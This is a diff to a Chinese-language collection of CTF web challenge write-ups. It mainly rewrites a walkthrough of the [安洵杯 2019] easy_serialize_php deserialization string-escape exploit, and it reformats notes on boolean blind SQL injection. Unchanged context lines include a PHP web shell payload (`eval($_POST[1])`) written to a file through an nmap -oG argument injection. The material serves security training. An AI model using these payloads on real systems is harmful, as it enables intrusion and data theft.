@@ -1525,7 +1525,7 @@ system('groups '.$username);
 ?host='<?php eval($_POST[1]);?> -oG 1.php '
 ```
 
-[参考](https://blog.csdn.net/m0_62422842/article/details/125451022)
+[参考文章](https://blog.csdn.net/m0_62422842/article/details/125451022)
 
 ## [BJDCTF2020]ZJCTF，不过如此
 
@@ -2068,7 +2068,7 @@ echo urlencode(serialize($a));
 
 ## [强网杯 2019]高明的黑客
 
-访问`www.tar.gz`下载了一套源码，有3002个文件，只有一个`index.html`是正常文件，其余都是看似乱码的php，翻了两三遍目录发现毫无收获，打开一个看看这些文件的内容是不是有什么玄机吧。
+访问`www.tar.gz`下载了一套源码，有`3002`个文件，只有一个`index.html`是正常文件，其余都是看似乱码的`php`，翻了两三遍目录发现毫无收获，打开一个看看这些文件的内容是不是有什么玄机吧。
 
 ```php
 <?php
@@ -2211,63 +2211,54 @@ if($function == 'highlight_file'){
 
 至于为什么`post`要传`_SESSION[flag]=123`而不是`$_SESSION[flag]=123`，是因为`_SESSION`是变量名，如果传`$_SESSION`，那么就会失效。
 
-这样才会进行序列化
+然后就是`反序列化字符串逃逸`，因为这里的`filter`函数是将匹配到的字符串清空，所以是反`序列化字符串逃逸(变短)`
+
+首先按照`phpinfo.php`给的信息读取文件
+
+```php
+<?php
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = 'show_image';
+$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';      // d0g3_f1ag.php的base64编码
+
+echo(serialize($_SESSION));
+```
+
+生成序列化后的字符串，取需要逃逸的部分，这里取的部分为红框里的部分
+
+![](./img/[安洵杯 2019]easy_serialize_php-1.png)
+
+在红框部分前面`随意加一个字符`，我这里加了`C`
 
 ```php
 $_SESSION["user"] = 'guest';
-$_SESSION['function'] = $function;
-$_SESSION['img']=base64_encode('guest_img.png');
+$_SESSION['function'] = 'C";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
+$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';      // d0g3_f1ag.php的base64编码
+
+echo(serialize($_SESSION));
 ```
 
-这里将下面的东西进行序列化
+然后看之前红框部分前面这里到添加的`C`字符这部分的长度来决定填充字符
 
-```php
-$_SESSION["user"] = 'guest';
-$_SESSION['function'] = 'a';
-$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';//d0g3_f1ag.php base64编码
-var_dump(serialize($_SESSION));
-//得到
-string(90) "a:3:{s:4:"user";s:5:"guest";s:8:"function";s:1:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
+![](./img/[安洵杯 2019]easy_serialize_php-2.png)
+
+这里需要逃逸`24`个字符，一个`flag`能逃逸`4`个，所以需要`6`个`flag`
+
+```json
+_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=C";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
 ```
 
-将这里的user和function进行修改，然后这里会进行代码一开始的过滤，将变量$img中的php flag php5 php4 fl1g的字符串替换成’'空字符
+![](./img/[安洵杯 2019]easy_serialize_php-3.png)
 
-```php
-$_SESSION["user"] = 'flagflagflagflagflagflag';
-$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}';
-$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码
-序列化后
-```
+因为`/d0g3_fllllllag`转为`base64`之后长度也是`20`，和`d0g3_f1ag.php`长度相同
 
-```
-a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
-```
+所以直接改`img`部分反序列化的值即可，`L2QwZzNfZmxsbGxsbGFn`
 
-将flag进行了过滤
+![](./img/[安洵杯 2019]easy_serialize_php-4.png)
 
-```
-a:3:{s:4:"user";s:24:"#";s:8:"function";s:59:"a#";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
-```
+[本人博客](https://cmacckk.github.io/2021/06/05/phpUnserialize/#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%8F%98%E7%9F%AD)
 
-由于`s:24`会往后边读取`24`位字符`";s:8:"function";s:59:"a`做为`user`的属性值, #号包含起来的部分，读取到a的时候结束，后面的;进行了闭合，相当于吞掉了一个属性和值，接着会继续读取我们构造的img，由于总共三个属性，我在后边加上了一个属性和值，后边的序列化结果直接就被丢弃
-
-payload：
-
-```
-_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}
-```
-
-得到了flag in `/d0g3_fllllllag`
-
-`/d0g3_fllllllag` `base64编码` `L2QwZzNfZmxsbGxsbGFn`
-
-payload：
-
-```
-_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";}
-```
-
-[参考](https://www.cnblogs.com/v2ish1yan/articles/16118319.html)
+[参考文章](https://www.cnblogs.com/v2ish1yan/articles/16118319.html)
 
 ## [SWPU2019]Web1
 
@@ -2370,21 +2361,21 @@ payload:
 
 和`id`为`1`时相同
 
-可以根据这个特性，判断后面的注入语句是否正确。经过测试发现mid、union被过滤了，可以考虑这个组合拳：
+可以根据这个特性，判断后面的注入语句是否正确。经过测试发现`mid`、`union`被过滤了，可以考虑这个组合拳：
 
-> ascii(x) ：只取x中第一位的ascii值，这也可以用ord()函数代替。
+> `ascii(x)` ：只取x中第一位的`ascii`值，这也可以用`ord()`函数代替。
 
-> substr(string string, int a, int b)：把string从a开始进行截取，截取长度为b。
+> `substr(string string, int a, int b)`：把`string`从`a`开始进行截取，截取长度为`b`。
 
-判断当前数据库名长度，等于4时返回“ERROR”，证明是1^1，语句为真：
+判断当前数据库名长度，等于`4`时返回`ERROR`，证明是`1^1`，语句为真：
 
 > 1^(length(database())=4)
 
-判断数据库第一位的ascii是否大于7，返回“ERROR”，证明是1^1，语句为真：
+判断数据库第一位的`ascii`是否大于`7`，返回`ERROR`，证明是`1^1`，语句为真：
 
 > 1^(ord(substr(database(),1,1))>7)
 
-判断数据库第一位的ascii是否大于199，返回“NO! Not this! Click others”，证明是1^0，语句为假：
+判断数据库第一位的`ascii`是否大于`199`，返回`NO! Not this! Click others`，证明是`1^0`，语句为假：
 
 > 1^(ord(substr(database(),1,1))>199)
 
